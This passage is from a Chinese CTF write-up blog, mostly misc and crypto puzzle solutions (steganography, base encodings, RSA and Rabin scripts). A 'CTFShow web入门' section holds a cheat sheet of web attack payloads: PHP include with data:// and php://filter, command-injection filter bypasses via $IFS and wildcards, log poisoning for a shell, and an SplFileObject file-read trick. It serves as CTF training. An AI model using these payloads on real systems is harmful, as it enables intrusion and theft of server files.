'r').readlines():\rdata = data[:-1]\rif '}' in data:\rdata = data.split('}')[-1]\rif '\\t' in data:\rdata1 = data[::].replace('\\t', '')\rdata1 = data1.replace(' ', '')\rif not data1:\rresult += data\rresult = result.replace('\\t', '1')\rresult = result.replace(' ', '0')\rprint(result)\r","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:17:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x11 Misc-[WUSTCTF2020]spaceclub 只有长空格和短空格，转成0和1 ，转二进制即可得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:18:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x12 Misc-[WUSTCTF2020]girlfriend wav播放后是很明显的拨号声，使用dtmf2num识别得到999*666*88*2*777*33*6*999*4*444*777*555*333*777*444*33*66*3*7777 分析numbers结合拨号的键，猜想是手机的九键输入法，依次对着输就能得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:19:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x13 Misc-[WUSTCTF2020]爬 发现文件头是PDF，修改后缀名。 打开文件，显示flag被图片挡住了。 用word打开，另存为docx，再把爬字拖动，得到一串16进制，转换得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:20:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x14 Misc-[WUSTCTF2020]find_me 在属性里发现疑似盲文的符号，直接转换得到flag ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:21:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x15 Misc-[WUSTCTF2020]alison_likes_jojo 给了两张图，先在boki里面发现有压缩包，分离一下。 分离后，确认不是未加密，先进行爆破，得到密码888866，解压得到beisi.txt的文件内容WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09，应该是base64没跑了，直接丢到cyberchef里面，自动解了3层，得到killerqueen。 分析jljy，多次尝试后发现为outguess加密，执行outguess -k killerqueen -r jljy.jpg 1.txt得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:22:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x16 Misc-[UTCTF2020]basic-forensics 文件是ebook，直接strings搜索得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:23:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x17 Misc-[UTCTF2020]File Carving binwalk分离png，得到hidden_binary file查看文件类型，运行可执行文件得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:24:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x18 Misc-[MRCTF2020]pyFlag 给了三张图，010点开分析发现文件尾都有一个SecretFilePart 拼接得到压缩包，发现加密，爆破出密码。 hint.txt内容为 我用各种baseXX编码把flag套娃加密了，你应该也有看出来。\r但我只用了一些常用的base编码哦，毕竟我的智力水平你也知道...像什么base36base58听都没听过\r提示：0x10,0x20,0x30,0x55\rflag.txt的内容为 G\u0026eOhGcq(ZG(t2*H8M3dG\u0026wXiGcq(ZG\u0026wXyG(j~tG\u0026eOdGcq+aG(t5oG(j~qG\u0026eIeGcq+aG)6Q\u003cG(j~rG\u0026eOdH9\u003c5qG\u0026eLvG(j~sG\u0026nRdH9\u003c8rG%++qG%__eG\u0026eIeGc+|cG(t5oG(j~sG\u0026eOlH9\u003c8rH8C_qH9\u003c8oG\u0026eOhGc+_bG\u0026eLvH9\u003c8sG\u0026eLgGcz?cG\u00263|sH8M3cG\u0026eOtG%_?aG(t5oG(j~tG\u0026wXxGcq+aH8V6sH9\u003c8rG\u0026eOhH9\u003c5qG(\u003cE-H8M3eG\u0026wXiGcq(ZG)6Q\u003cG(j~tG\u0026eOtG%+\u003caG\u0026wagG%__cG\u0026eIeGcq+aG\u0026M9uH8V6cG\u0026eOlH9\u003c8rG(\u003cHrG(j~qG\u0026eLcH9\u003c8sG\u0026wUwGek2) 根据提示猜测用到了base16、base32、base64(感觉上面应该是0x40才对，这里是个小bug，但没有base48)、base85，只需要试出第一层，剩下的交给cyberchef即可解出flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:25:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x19 Misc-[MRCTF2020]千层套路 压缩包第一层是0573.zip，爆破发现密码就是0573，下一层是0114.zip，密码也和文件名相同，需要编写脚本来解决套娃。 from os import system\rimport zipfile\rzipname = \"0573.zip\"\rf = zipfile.ZipFile(zipname, 'r')\rwhile 1:\rtry:\rname = f.namelist()[0]\rf.extractall(pwd=bytes(zipname[0:4],'utf-8'))\rsystem('rm -rf '+ str(zipname))\rf = zipfile.ZipFile(name, 'r')\rzipname = name\rexcept:\rbreak\r跑了几分钟最后得到qr.txt，可以看到是rgb的数据 把前后括号都删去，然后用下面的脚本，得到一张二维码，扫描得到flag。 from PIL import Image\rx = y = 200\rimg = Image.new(\"RGB\",(x,y))\rfile = open('./qr.txt','r')\rfor width in range(0,x):\rfor height in range(0,y):\rline = file.readline()\rrgb = line.split(',')\rimg.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))\rimg.save('flag.jpg')\r","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:26:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x1A MISC-[HackingClubCTF 2022]我说这是莫斯 扫描二维码得到swpuctf{flag_is_not_here}，假的，yongbinwalk发现图片藏有4个rar，分离一下。 先在encode.txt得到一段base64编码YXNkZmdoamtsMTIzNDU2Nzg5MA==，asdfghjkl1234567890。 flag.doc中发现一段多重base64加密的字符串，解密后得到comEON_YOuAreSOSoS0great。 解压压缩包得到一段音频文件，只有长短两种，怀疑是莫斯电码。 记录得到--/---/.-./…/./../…/…-/./.-./-.--/…-/./.-./-.--/./.-/…/-.--，转换得到MORSEISVERYVERYEASY ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:27:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x1B MISC-[HackingClubCTF 2022]我的路由器 下载得到conf.bin文件，使用RouterPassView打开，得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:28:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x1C Crypto-[HackingClubCTF 2022]无AC保护 仔细观察发现字符串里都包含5x55303030303030 5x5530303030303036365x5530303030303036435x5530303030303036315x5530303030303036375x5530303030303037425x5530303030303037375x5530303030303036355x5530303030303036435x5530303030303036335x5530303030303036465x5530303030303036445x5530303030303036355x5530303030303035465x5530303030303037345x5530303030303036465x5530303030303035465x5530303030303036385x5530303030303036315x5530303030303036335x5530303030303036425x5530303030303036395x5530303030303036455x5530303030303036375x5530303030303036335x5530303030303036435x5530303030303037355x5530303030303036325x5530303030303035465x5530303030303034335x5530303030303035345x5530303030303034365x5530303030303035465x5530303030303036355x5530303030303036315x5530303030303037335x5530303030303037395x5530303030303035465x5530303030303034335x5530303030303037325x5530303030303037395x5530303030303037305x5530303030303037345x5530303030303036465x553030303030303744 全部删除得到 36363643363136373742373736353643363336463644363535463734364635463638363136333642363936453637363336433735363235463433353434363546363536313733373935463433373237393730373436463744 转换得到flag ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:29:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x1E Crypto-[HackingClubCTF 2022]Beautiful ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:30:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"\r","date":"2022-03-01","objectID":"/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/:0:0","tags":["CTF","Web安全"],"title":"CTFShow-web入门（1）","uri":"/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/"},{"categories":["WriteUp"],"content":"0x00 信息搜集 列举常见的信息搜集手法 查看源代码 ctrl+shift+i 查看响应包的headers 查看robots.txt 下载phps源码 下载目录源码，如：www.zip 查看.git或.svn文件 vim编辑时会产生一个filename.swp的文件，例如：index.php.swp 查看cookie 查看域名信息，可通过https://zijian.aliyun.com/等 查看网页公开信息，比如电话号、QQ、邮箱 查看公开技术文档 小0day:KindEditor PHP默认配置下插入文件，如果目录不存在，则会遍历服务器根目录 php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针 数据库备份文件，如：backup.sql和/db/db.mdb 查看加密算法及密钥 ","date":"2022-03-01","objectID":"/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/:1:0","tags":["CTF","Web安全"],"title":"CTFShow-web入门（1）","uri":"/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/"},{"categories":["WriteUp"],"content":"0x01 爆破 Custom iterator爆破，参考https://www.cnblogs.com/007NBqaq/p/13220297.html 子域名爆破 根据php算法爆破token php伪随机数，种子预测随机数和随机数预测种子。https://blog.csdn.net/zss192/article/details/104327432 爆破身份证 爆破文件目录，如/0/1/ ","date":"2022-03-01","objectID":"/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/:2:0","tags":["CTF","Web安全"],"title":"CTFShow-web入门（1）","uri":"/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/"},{"categories":["WriteUp"],"content":"0x02 命令执行 通配符?和* 引号拼接，如：fl''ag.php，fl\"\"ag.php \\拼接，如：fla\\g.php 可执行并直接显示结果的函数：system、passthru 需要echo显示结果的函数：反引号`、exec、shell_exec https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/ cat被过滤时，常见读文件命令 curl命令读文件\rstrings:查找可打印的字符串\rrev:反转查看内容\rmore/less:一页一页的显示内容\rhead:查看头几行 tail:查看尾几行\rtac:从最后一行开始显示\rnl：显示的时候，顺便输出行号\rsort:将文本文件内容加以排序\runiq:检查文本文件中重复出现的行列\rvi/vim:编辑器查看\rgrep:查找文件里符合条件的字符串\rawk:处理文本文件\rNF 每一行拥有的字段总数\rNR 目前处理的是第几行的数据\rFS 目前的分隔字符\rawk '条件{命令}' 文件\r常用payload:awk 'NR\u003c10{print $1\"\\t\"$2\"\\t\"$3}' flag\r把flag文件中的前10行的第1、2、3列的数据列出来 （以[tab]或空格键分隔）\rsed:处理文本文件\rsed '命令' 文件\r常用payload:sed '1,10d' flag\r查看flag文件1~10行的内容\rbash -v:打印整个文件后执行\rfile -f:指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。\rod:以二进制的方式读取内容\r-A 指定地址进制包括：\ro 八进制（系统默认值）\rd 十进制\rx 十六进制\rn 不打印位移值\r-t 指定数据的显示格式，主要参数有：\rc ASCII字符或反斜杠序列(如\\n)\rd 有符号十进制数\rf 浮点数\ro 八进制（系统默认值）\ru 无符号十进制数\rx 十六进制数\rcut:用于显示每行从开头算起 num1 到 num2 的文字\r-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。\r-c ：以字符为单位进行分割。\r花式读文件：https://www.cnblogs.com/linuxsec/articles/10741588.html php函数操作： scandir('.') 扫描当前目录\rlocaleconv() 函数返回一数组。而数组第一项就是.(用来绕过.过滤)\rpos()/current() 返回数组第一个值\r数组操作函数： end() 数组指针指向最后一位\rnext() 数组指针指向下一位\rarray_reverse() 将数组颠倒\rarray_rand() 随机返回数组的键名\rarray_flip() 交换数组的键和值\r读取文件函数：file_get_content() 、readfile()、highlight_file()、show_source()、var_dump(file('filename'))、print_r(file('filename')) 一些情况下也可通过include、require、include_once、require_once读取文件内容。 过滤分号时可以使用?\u003e替代; 过滤括号时可以使用include和伪协议的配合 因为include包含php文件不会在页面显示出来\r所以可以配合伪协议将flag.php打印,而且新的参数不会受过滤影响\r常用payload: c=include$_GET[\"a\"]?\u003e\u0026a=php://filter/read=convert.base64-encode/resource=flag.php\rc=include$_GET['a']?\u003e\u0026a=data://text/plain,\u003c?php system(\"cat flag.php\");?\u003e\rc=include$_GET[a]?\u003e\u0026a=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\r日志包含获取Shell，如果访问一个不存在的资源时，如http://www.xxxx.com/\u003c?php phpinfo(); ?\u003e,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，可以通过burpsuit绕过编码写入apache的日志文件，前提是得知道日志文件的存储路径。 日志默认路径 (1) apache+Linux日志默认路径\r/etc/httpd/logs/access.log或者/var/log/httpd/access.log\rn\r(2) apache+win2003日志默认路径\rD:\\xampp\\apache\\logs\\access.log或者D:\\xampp\\apache\\logs\\error.log\r(3) IIS6.0+win2003默认日志文件\rC:\\WINDOWS\\system32\\Logfiles\r(4) IIS7.0+win2003 默认日志文件\r%SystemDrive%\\inetpub\\logs\\LogFiles\r(5) nginx 日志文件\r日志文件在用户安装目录logs目录下，如/usr/local/nginx,日志目录为/usr/local/nginx/logs\r通过.php后缀限制include时，使用data://text/plain, 相当于执行了php语句，因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示。 无字母数字绕过正则表达式总结脚本：https://blog.csdn.net/miuzzx/article/details/109143413 一些不包含数字和字母的webshell：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html 无字母数字webshell之提高篇：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html session_id()结合PHPSESSID，受php版本影响 5.5 -7.1.9均可以执行，session_id规定为0-9，a-z,A-Z,-中的字符。 命令分隔 换行符 %0a\r回车符 %0d\r连续指令 ;\r后台进程 \u0026（编码%26）\r管道符 |\r(逻辑?) || \u0026\u0026\rwindows中：%1a（作为.bat文件中的命令分隔符）\r空格绕过 \u003e、\u003c、\u003c\u003e //重定向符,通常结合nl等命令使用\r%09(需要php环境,tab)\r${IFS}\r$IFS\r$IFS$9\r, //用逗号实现了空格功能\r%20\r过滤字母时可用payload:c=/???/????64 ????.???读取flag.php，bin目录为binary的简写，主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，这里可以利用 base64 中的64 进行通配符匹配，即/bin/base64 flag.php。 另一种payload:c=/???/???/????2 ????.???，可通过/usr/bin目录，常包括例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等，可以利用/usr/bin下的bzip2将flag.php文件进行压缩，然后再下载。 构造数字，$(( ))与整数运算 $(())---------是0\r$((~$(())))---是-1\r$((~$(())))$((~$(())))---是-1-1\r$(($((~$(())))$((~$(())))))---是-2\r同时$((~-a))=a-1，如：$((~-5))=4\r$((~a))=-a-1，如：$((~5))=-6\r通过fopen去读取文件内容\rfread()\rfgets()\rfgetc()\rfgetss()//This function has been DEPRECATED as of PHP 7.3.0, and REMOVED as of PHP 8.0.0\rfgetcsv()\rfpassthru()\r对应payload: c=$a=fopen(“flag.php”,“r”);while (!feof($a)) {$line = fread($a,filesize(“flag.php”));echo $line;} c=$a=fopen(“flag.php”,“r”);while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取 c=$a=fopen(“flag.php”,“r”);while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取 c=$a=fopen(“flag.php”,“r”);whi","date":"2022-03-01","objectID":"/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/:3:0","tags":["CTF","Web安全"],"title":"CTFShow-web入门（1）","uri":"/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/"},{"categories":["WriteUp"],"content":"\r","date":"2022-02-28","objectID":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/:0:0","tags":["CTF"],"title":"2月CTF练习","uri":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x00 卷王杯-easyweb 核心代码如下 \u003c?php\rerror_reporting(0);\rif(isset($_GET['source'])){\rhighlight_file(__FILE__);\recho \"\\$flag_filename = 'flag'.md5(???).'php';\";\rdie();\r}\rif(isset($_POST['a']) \u0026\u0026 isset($_POST['b']) \u0026\u0026 isset($_POST['c'])){\r$c = $_POST['c'];\r$count[++$c] = 1;\rif($count[] = 1) {\r$count[++$c] = 1;\rprint_r($count);\rdie();\r}else{\r$a = $_POST['a'];\r$b = $_POST['b'];\recho new $a($b);\r}\r}\r?\u003e\r首先需要绕过$count[]=1，这里可以通过数组的key值溢出，设c为9223372036854775806。而后传入a和b，通过原生类读取文件。参考：https://blog.csdn.net/qq_38154820/article/details/121112935 先可通过DirectoryIterator类来遍历目录，但只返回迭代器的第一项，利用glob协议看到假的文件 a=DirectoryIterator\u0026b=glob://flag*\r但我们知道md5加密后的字符无非是[a-z]和[0-9]，在b=glob://flag*后爆破一位即可得到真实flag的文件。 最后使用SplFileObject类，读取文件内容。构造 a=SplFileObject\u0026b=php://filter/convert.base64-encode/resource=flag56ea8b83122449e814e0fd7bfb5f220a.php\r最后base64解码得到flag。 ","date":"2022-02-28","objectID":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/:1:0","tags":["CTF"],"title":"2月CTF练习","uri":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x01 卷王杯-真·简单·不卷·现代密码签到 n = p * q * r * s * t e = 2 m = bytes_to_long(os.urandom(500) + flag) c = pow(m,e,n) print(p,q,r,s,t,sep='\\n') print(c) ''' 145332367700944303747548912160113939198078051436029477960348968315913956664143693347226702600438608693933768134575289286283267810723137895903153829001826223446477799895493265422562348917012216790077395795861238257357035152687833639085415763850743538206986781418939737511715957738982536382066693822159860701263 116660458253067608044065523310547233337730583902133756095473339390057738510707447906971188577217274861047379404014140178165569604404468897712846876108444468370709141219302291601408652742006268186059762087155933131837323952675627966299810891805398890428420575425160696531236660480933905879208166090591482794763 157931722402853245421436270609912823260313730941283152856444641969403238646482562190531038393124087232554754746464603598717356255570166081501573727336977292059427220330169044611674973569766966838498453232642731737958791706086957762244686953294662693939604300864961637325536379321027705854708492453330690705531 100973451687449518854742673778783266158999451072058606348222018797891147675959983616210003484476577612134482311993701677242007759556951494382833070563369964294544839433671087037596159753825249018950693369209927951667775267086896180395776150188902057785214767230658487267587289809918132337927575673868568976679 93960345071948255233882121683650797512129333868351496468898834736770441398743300745703393838320587998953678254272245400344928586394089488734271897540051673996675973642347859306921527430850673334243441180183460927865980713929789963587608547554858491264614271309608925634272282292964002897650355047792764365447 9144597920381774885442906257311149465702295057238600973973598305004391534618770363098565074541384771979931799878381439264848137810353858418200992191234142740194489573540381681161219332611454834544291634628456257670178843484698324641739324687497388018406214041657278323855749902661752448796122517061920880552011343608609622885787617238758769398972009949575526258430282648817039091284796330585349957724522615105102735930258969562103112238020133587096826386028128471852377225525357348919204333121695432662339443004327748973224423132988376298843862056631045488285859621661802413201793962883794915513510467912312842687601478117040419013468059983777273699192408773551806581458197324620065210523913467414181480875280203580147077789063808832356486197271376615883221558265591069223727607585313240243619515521180600435114131162272519949101464089935441251751426683447701142156416866113627126765919641034042927519834229168536331952275698122511502745177547569813354280565828372968703810158857859460406828090199683324760956105682902577189283246483314689365570862217407333103243336691401424548702387876409228977278498691200028282744239512091373110111792177228979867318546462714521296256938374618636206565791541769138267080789842400796973226733816939794717596194090232425688504890234304977612220790858557639246367437740975495450011676714198668471438814299689325208882261918460708833888406187912527346628912894921059735420931656953236560178909180587372589456926690219114173193202048332172538564489660440225377822914097420807957784201785024166011709377791129 ''' 分析题目可知公钥n由多素数相乘，e=2是Rabin加密典型特征。核心原理参考：https://www.ruanx.net/rsa-solutions/，本题的难点在于一般rsa的Rabin算法解密都是只有2个素数，这里却有5个，对不熟悉原理的人而言很容易混乱，其实这个考点的本质是对中国剩余定理的理解。写成如下脚本： def squareMod(c, mod): # 模意义下开根，找到 x, 使得 x^2 % mod = c\rres = gmpy2.powmod(c, (mod+1)//4, mod)\rreturn res, mod - res\rdef format_var(x,p,n):\rMp = n//p\rreturn (x*Mp*gmpy2.invert(Mp, p))\rdef getPlaintext(x, y, z, a, b, p, q, r, s, t,n): # 假设 m%p=x, m%q=y, 求明文\rres = format_var(x,p,n)+format_var(y,q,n)+format_var(z,r,n)+format_var(a,s,n)+format_var(b,t,n)\rreturn res % n\rdef solve(c, p, q,r,s,t,n): # 已知 p,q,r,s,t, 解密 c\rpx = squareMod(c, p)\rpy = squareMod(c, q)\rpz = squareMod(c, r)\rpa = squareMod(c, s)\rpb = squareMod(c, t)\rfor x in px:\rfor y in py:\rfor z in pz:\rfor a in pa:\rfor b in pb:\ryield getPlai","date":"2022-02-28","objectID":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/:2:0","tags":["CTF"],"title":"2月CTF练习","uri":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x02 卷王杯-犯罪高手_签到 可以取钱、查看余额、购买flag，取钱有限制，存钱需要银根。先搜索下日升昌银号，发现存在一个日昇昌密码法则。 谨防假票冒取 勿忘细视书章\r堪笑世情薄 天道最公平\r昧心图自私 阴谋害他人\r善恶终有报 到头必分明\r坐客多察看 斟酌而后行\r国宝流通\r顺口溜中的“谨防假票冒取 勿忘细视书章”是代表1至12个月，“堪笑世情薄，天道最公平。昧心图自私，阴谋害他人。善恶终有报，到头必分明”则是表示1至30天。“坐客多察看，斟酌而后行”是银两的1至10，“国宝流通”是万千百两。例如票号在6月10日给某省票号分号汇银3000两，其暗号代码就是“取平多宝通”。 取钱时会出现银根，猜想也是某种顺口溜，多次测试发现。 10-氏通赵\r20-连通赵\r30-城通赵\r40-壁通赵\r99-传通传\r搜索关键词得到诗句，赵氏连城壁，由来天下传，猜想“国宝流通”依旧代表万千百两。最后，存钱要达到传国传宝传流传通传 ","date":"2022-02-28","objectID":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/:3:0","tags":["CTF"],"title":"2月CTF练习","uri":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x03 HSC-Doraemon zip密码6位数爆破为376852 修改图片高度，可以得到一个残缺的二维码，修复下，加上定位符。 扫描得到flag ","date":"2022-02-28","objectID":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/:4:0","tags":["CTF"],"title":"2月CTF练习","uri":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x04 HSC-WIRESHARK 分析zip里面藏了个png，提取出来。 接着用Stegsolve提取LSB信息，发现PNG字样 保存为图片得到一个二维码，扫描结果是wrsak..iehr370 经过栅栏密码2栏解密，得到wireshark3.7.0，就能解开压缩包了，解开的文件二进制内容中发现关键字段类似pdf，修改后缀名为pdf。 010editor分析文件格式，发现文件头残缺，补齐为255044462D312E，最后使用wbStego4.3open工具获取隐藏信息 ","date":"2022-02-28","objectID":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/:5:0","tags":["CTF"],"title":"2月CTF练习","uri":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x05 HSC-android 写了个很蠢的脚本，反正能跑出来 v8_1 = []\rv2 = [102, 13, 99, 28, 0x7F, 55, 99, 19, 109, 1, 0x79, 58, 83, 30, 0x4F, 0, 0x40, 42]\rfor v4 in range(0,18):\rv8_1.append(-1) for v4 in range(0,18):\rif (v4 % 2 == 0):\rv8_1[v4] = v2[v4] ^ v4\rfor v4 in range(0,18):\rif (v4 % 2 != 0):\rif (v8_1[v4] != -1) :\rv8_1[v4+1] = v8_1[v4] ^ v2[v4]\relse:\rif(v4\u003c17 and v8_1[v4+1] != -1):\rv8_1[v4] = v8_1[v4+1] ^ v2[v4]\rfor i in v8_1[:-1]:\rprint(chr(i),end='')\r","date":"2022-02-28","objectID":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/:6:0","tags":["CTF"],"title":"2月CTF练习","uri":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x06 HSC-RSA import gmpy2 import sympy from Crypto.Util.number import * flag = b'????' z=getPrime(1024) p=sympy.nextprime(z) q=sympy.prevprime(10*z) n=p*q m=bytes_to_long(flag) e=0xe18e c=pow(m,e,n) print(\"n=\",n) print(\"c=\",c) #n= 124689085077258164778068312042204623310499608479147230303784397390856552161216990480107601962337145795119702418941037207945225700624828698479201514402813520803268719496873756273737647275368178642547598433774089054609501123610487077356730853761096023439196090013976096800895454898815912067003882684415072791099101814292771752156182321690149765427100411447372302757213912836177392734921107826800451961356476403676537015635891993914259330805894806434804806828557650766890307484102711899388691574351557274537187289663586196658616258334182287445283333526057708831147791957688395960485045995002948607600604406559062549703501 #c= 57089349656454488535971268237112640808678921972499308620061475860564979797594115551952530069277022452969364212192304983697546604832633827546853055947447207342333989645243311993521374600648715233552522771885346402556591382705491510591127114201773297304492218255645659953740107015305266722841039559992219190665868501327315897172069355950699626976019934375536881746570219967192821765127789432830133383612341872295059056728626931869442945556678768428472037944494803103784312535269518166034046358978206653136483059224165128902173951760232760915861623138593103016278906012134142386906130217967052002870735327582045390117565 简单分析下这道题目，p和q之间的关系如下 p = z + a\rq = 10*z - b\r我们知道p、q都是加减了某个常数\r10*p = 10*z + 10*a = 10*z + A\r把p放大\r10*p - q = A + b = k\r得到10*p和q的差为一个常数\r设tp = 10 * p\rk**2=tp**2 - 2 * tp * q + q**2=(tp)**2 - 2 * t * n + q**2\rk**2 + 4 * t *n = tp**2 + 2 * tp * q + q**2\r可以通过爆破k值来计算出tp + q，从而计算出p和q，脚本如下： t=10\rfor k in range(0,1000):\rx = gmpy2.iroot(k**2 + 4 * t * n,2)\rif x[1]:# t*p+q是整数\rp = (x[0] + k)//(2 * t)\rq = t*p - k\rprint('p:',p,'\\nq:',q)\rbreak\r计算得出p、q p: 111664266924230584310672217327671667710935047973000520430654738129104995948600035802171323708501939460183230462999012738673733788510305174275781562493391778161104978492924899451563162871226400785486072759568388184737567195610022831797165685808940056623572151053130363074869912224709981475153891324423022575151 q: 1116642669242305843106722173276716677109350479730005204306547381291049959486000358021713237085019394601832304629990127386737337885103051742757815624933917781611049784929248994515631628712264007854860727595683881847375671956100228317971656858089400566235721510531303630748699122247099814751538913244230225750851 此时发现gmpy2.gcd(e,phi)=2，不能直接用常规解法。 i = gmpy2.gcd(e,phi)\rd = gmpy2.invert(e//i,phi)\rm = pow(c,d,n)\rflag = gmpy2.iroot(m,i)\rif flag[1]:\rprint(long_to_bytes(flag[0]))\r","date":"2022-02-28","objectID":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/:7:0","tags":["CTF"],"title":"2月CTF练习","uri":"/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x07 HSC-BABYRSA 求出p高位 def lfsr(status,mask): out = (status \u003c\u003c 1) \u0026 0xffffffff i=(status\u0026mask)\u00260xffffffff lastbit=0 while i!=0: lastbit^=(i\u00261) i=i\u003e\u003e1 out^=lastbit return (out,lastbit) status= 1 mask = 0b10110001110010011100100010110101 c = list('0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010') p = '' for i in range(568): (status,out) = lfsr(status,mask) p += str(int(c[i])^out) p = int(p, 2) print(hex(p)) # 